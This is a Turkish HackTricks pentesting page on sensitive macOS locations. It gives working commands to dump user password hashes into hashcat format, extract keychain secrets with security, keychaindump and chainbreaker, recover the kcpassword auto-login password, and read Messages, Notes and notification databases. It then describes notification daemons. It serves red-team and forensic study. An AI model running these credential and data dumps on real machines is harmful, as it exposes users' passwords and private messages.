# macOS Hassas Konumlar ve İlginç Daemonlar

<details>

<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi**]'ni(https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'ler**]'imiz(https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Parolalar

### Gölge Parolaları

Gölge parolaları, kullanıcının yapılandırmasıyla birlikte **`/var/db/dslocal/nodes/Default/users/`** konumunda bulunan plist dosyalarında saklanır.\
Aşağıdaki oneliner, **kullanıcılar hakkındaki tüm bilgileri** (hash bilgileri dahil) dökmek için kullanılabilir:

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Bu örnekteki betikler**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) veya [**bu örnekteki**](https://github.com/octomagon/davegrohl.git) betikler, **hashcat** **formatına** dönüştürmek için kullanılabilir.

Tüm hizmet hesaplarında olmayan kimlik bilgilerini **hashcat** formatına dökecek alternatif bir tek satırlık komut `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Anahtarlık Dökümü

Güvenlik ikilisini kullanarak **şifreleri şifrelenmiş olarak dökmek** istendiğinde, birkaç uyarı kullanıcıdan bu işlemi izlemesini isteyecektir.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Bu yorum temel alınarak [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) gibi görünüyor ki bu araçlar artık Big Sur'da çalışmıyor.
{% endhint %}

### Keychaindump Genel Bakış

**keychaindump** adlı bir araç, macOS anahtarlıklarından şifreleri çıkarmak için geliştirilmiştir, ancak Big Sur gibi yeni macOS sürümlerinde sınırlamalarla karşılaşmaktadır, [tartışmada](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) belirtildiği gibi. **keychaindump**'ın kullanımı, saldırganın **root** erişimi elde etmesini ve ayrıcalıkları yükseltmesini gerektirir. Araç, anahtarlığın kullanıcı girişinde varsayılan olarak kilidini açık tutulması gerçeğinden yararlanır, bu da uygulamaların kullanıcının şifresini sürekli olarak girmesini gerektirmeksizin buna erişmesine olanak tanır. Bununla birlikte, bir kullanıcının her kullanımdan sonra anahtarlığını kilitlemeyi tercih etmesi durumunda, **keychaindump** etkisiz hale gelir.

**Keychaindump**, Apple tarafından yetkilendirme ve kriptografik işlemler için bir daemon olarak tanımlanan **securityd** adlı belirli bir işlemi hedef alarak çalışır. Çıkarma işlemi, kullanıcının giriş şifresinden türetilen bir **Anahtar Anahtarı**nı tanımlamayı içerir. Bu anahtar, anahtarlık dosyasını okumak için gereklidir. **Master Key**'i bulmak için **keychaindump**, potansiyel anahtarları aramak için `MALLOC_TINY` olarak işaretlenen alanlarda **securityd**'nin bellek yığınını `vmmap` komutunu kullanarak tarar. Bu bellek konumlarını incelemek için aşağıdaki komut kullanılır:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Potansiyel anahtarları tanımladıktan sonra, **keychaindump**, anahtar için bir adayı gösteren (`0x0000000000000018`) belirli bir deseni aramak için heap'leri tarar. Bu anahtarı kullanabilmek için deşifre etme de dahil olmak üzere daha fazla adım, **keychaindump**'ın kaynak kodunda belirtildiği gibi gereklidir. Bu alana odaklanan analistler, anahtar zincirini şifrelemek için gerekli olan kritik verilerin **securityd** işlemi belleğinde saklandığını unutmamalıdır. **keychaindump**'ı çalıştırmak için bir örnek komut:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker), bir OSX anahtar zincirinden aşağıdaki türde bilgileri adli bütünlük kurallarına uygun bir şekilde çıkarmak için kullanılabilir:

* Hashlenmiş Keychain şifresi, [hashcat](https://hashcat.net/hashcat/) veya [John the Ripper](https://www.openwall.com/john/) ile kırılmak üzere uygun
* İnternet Şifreleri
* Genel Şifreler
* Özel Anahtarlar
* Genel Anahtarlar
* X509 Sertifikaları
* Güvenli Notlar
* Appleshare Şifreleri

Anahtar zincirini açma şifresi, [volafox](https://github.com/n0fate/volafox) veya [volatility](https://github.com/volatilityfoundation/volatility) ile elde edilen bir anahtar veya SystemKey gibi bir açma dosyası ile, Chainbreaker ayrıca düz metin şifreler sağlayacaktır.

Anahtar Zincirini açmanın bu yöntemlerinden biri olmadan, Chainbreaker tüm diğer mevcut bilgileri gösterecektir.

#### **Anahtar zinciri anahtarlarını dök**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKey ile anahtarlık anahtarlarını (şifrelerle birlikte) dökün**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Anahtarlık anahtarlarını (şifrelerle birlikte) kırarak dökün**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Hafıza dökümü ile anahtarlık anahtarlarını (şifrelerle birlikte) dökün**

**Hafıza dökümü** yapmak için [bu adımları izleyin](../#dumping-memory-with-osxpmem)
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Kullanıcı şifresini kullanarak anahtarlık anahtarlarını (şifrelerle birlikte) dökme**

Kullanıcı şifresini bildiğinizde, bunu kullanarak kullanıcıya ait anahtarlıkları **dökebilir ve şifreleyebilirsiniz**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

**kcpassword** dosyası, yalnızca sistem sahibi **otomatik girişi etkinleştirmişse** kullanıcının **giriş şifresini** tutan bir dosyadır. Bu nedenle, kullanıcıya şifre sorulmadan otomatik olarak giriş yapılacaktır (bu çok güvenli değildir).

Şifre, **`/etc/kcpassword`** dosyasında **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** anahtarı ile xorlanmış olarak saklanır. Kullanıcının şifresi anahtardan daha uzunsa, anahtar tekrar kullanılacaktır.\
Bu, şifrenin oldukça kolay bir şekilde kurtarılmasını sağlar, örneğin [**bu gibi**](https://gist.github.com/opshope/32f65875d45215c3677d) betikler kullanılarak.
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Bildirimler

Bildirim verilerini `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/` dizininde bulabilirsiniz.

Çoğu ilginç bilgi **blob** içinde olacaktır. Bu nedenle, o içeriği **çıkarmalı** ve insanların **okuyabileceği** hale **dönüştürmelisiniz** ya da **`strings`** kullanmalısınız. Buna erişmek için şunu yapabilirsiniz:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

### Notlar

Kullanıcıların **notları**, `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` dizininde bulunabilir. 

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

## Tercihler

MacOS uygulamalarındaki tercihler **`$HOME/Library/Preferences`** konumundadır ve iOS'ta ise `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences` konumundadır.&#x20;

MacOS'ta **`defaults`** adlı cli aracı **Tercihler dosyasını değiştirmek** için kullanılabilir.

**`/usr/sbin/cfprefsd`**, XPC hizmetlerini `com.apple.cfprefsd.daemon` ve `com.apple.cfprefsd.agent` iddialıdır ve tercihleri değiştirmek gibi eylemleri gerçekleştirmek için çağrılabilir.

## Sistem Bildirimleri

### Darwin Bildirimleri

Bildirimler için ana daemon **`/usr/sbin/notifyd`**'dir. Bildirimleri alabilmek için istemciler, `com.apple.system.notification_center` Mach portu üzerinden kayıt olmak zorundadır (`sudo lsmp -p <pid notifyd>` ile kontrol edilebilir). Daemon, `/etc/notify.conf` dosyası ile yapılandırılabilir.

Bildirimler için kullanılan isimler benzersiz ters DNS gösterimleridir ve bir bildirim birine gönderildiğinde, bunu işleyebileceğini belirten istemciler alacaktır.

Mevcut durumu (ve tüm isimleri görmek) görmek için, sinyal SIGUSR2'yi notifyd işlemine göndererek ve oluşturulan dosyayı okuyarak `/var/run/notifyd_<pid>.status` dosyasını boşaltmak mümkündür:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Dağıtılmış Bildirim Merkezi

Ana ikili dosyası **`/usr/sbin/distnoted`** olan **Dağıtılmış Bildirim Merkezi**, bildirimler göndermenin başka bir yoludur. Bazı XPC hizmetlerini açığa çıkarır ve istemcileri doğrulamak için bazı kontroller yapar.

### Apple Push Bildirimleri (APN)

Bu durumda, uygulamalar **konular** için kayıt oluşturabilir. İstemci, Apple'ın sunucularına **`apsd`** aracılığıyla ulaşarak bir belirteç oluşturacaktır.\
Daha sonra, sağlayıcılar da bir belirteç oluşturacak ve Apple'ın sunucularına bağlanarak istemcilere mesaj gönderebilecektir. Bu mesajlar yerel olarak **`apsd`** tarafından alınacak ve bekleyen uygulamaya iletilen bildirimi iletecektir.

Tercihler, `/Library/Preferences/com.apple.apsd.plist` konumundadır.

macOS'ta `/Library/Application\ Support/ApplePushService/aps.db` ve iOS'ta `/var/mobile/Library/ApplePushService` konumunda mesajların yerel veritabanı bulunmaktadır. 3 tabloya sahiptir: `incoming_messages`, `outgoing_messages` ve `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Ayrıca, şu kullanılarak daemon ve bağlantılar hakkında bilgi almak mümkündür:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Kullanıcı Bildirimleri

Bu, kullanıcının ekranda görmesi gereken bildirimlerdir:

- **`CFUserNotification`**: Bu API, ekranda bir mesajla birlikte bir pop-up göstermenin bir yolunu sağlar.
- **Bülten Panosu**: Bu, iOS'ta kaybolan bir banner gösterir ve Bildirim Merkezi'nde saklanır.
- **`NSUserNotificationCenter`**: Bu, MacOS'ta iOS bülten panosudur. Bildirimlerle ilgili veritabanı, `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db` konumundadır.
